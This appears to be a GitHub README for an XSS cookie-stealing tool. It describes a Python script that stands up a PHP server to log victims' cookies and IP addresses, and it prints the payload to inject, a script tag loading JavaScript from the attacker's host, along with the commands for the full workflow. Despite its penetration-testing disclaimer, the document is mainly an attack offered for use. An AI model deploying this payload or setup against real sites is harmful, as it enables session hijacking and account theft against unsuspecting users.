# xss-cookie-stealer
Simple Python script that will set up a PHP server for stealing cookies - and provided the payload needed. 


# Web Server Setup for Cookie Stealing via XSS

This Python script automates the process of setting up a simple PHP server to capture cookies via Cross-Site Scripting (XSS). The script generates an XSS payload, creates a web server directory, and runs a PHP server that logs victim cookies to a file.

## Features
- Generates an XSS payload for `<script>` injection.
- Sets up a PHP server that captures cookies from victims.
- Logs the cookies to `cookies.txt` along with the victim's IP address.
- Automatically creates the necessary files (`script.js` and `index.php`).

## Prerequisites
- Python 3.x
- PHP (required to run the web server)
- `sudo` privileges (required to run PHP on port 80)

## Usage

### Display Help
You can display the help message by running:

```bash
python3 xss-cookie-stealer.py -h
```

### Run the Script
To generate the payload and set up the PHP server, provide your IP address as an argument:

```bash
python3 xss-cookie-stealer.py <YOUR_IP>
```

Example:

```bash
python3 xss-cookie-stealer.py 192.168.1.10
```

### Payload
After running the script, the XSS payload will be echoed to the terminal. You can inject this payload into a vulnerable web page to capture cookies:

```html
<script src="http://<YOUR_IP>/script.js"></script>
```

### Files Created
The script will create the following files in the `web-server` directory:
- **`index.php`**: Handles the incoming requests and logs cookies to `cookies.txt`.
- **`script.js`**: Sends the victim's cookies to the PHP script.

### Start PHP Server
The script will start a PHP server on port 80 to host the web server:

```bash
sudo php -S 0.0.0.0:80 -t web-server
```

### Log Output
Captured cookies and victim IP addresses will be saved in the `cookies.txt` file inside the `web-server` directory.

## Example Workflow

1. Run the script with your IP address:
   ```bash
   python3 create_payload.py 192.168.1.10
   ```

2. Inject the payload in a vulnerable website:
   ```html
   <script src="http://192.168.1.10/script.js"></script>
   ```

3. Any cookies sent by users visiting the vulnerable page will be logged in `cookies.txt` along with their IP address.

## License
This project is for educational purposes only. Ensure that you have permission before using this script on any system or application.

---

**Disclaimer**: This script is intended for ethical purposes only, such as penetration testing within legal and authorized boundaries. Misuse of this tool for illegal activities is strictly prohibited.
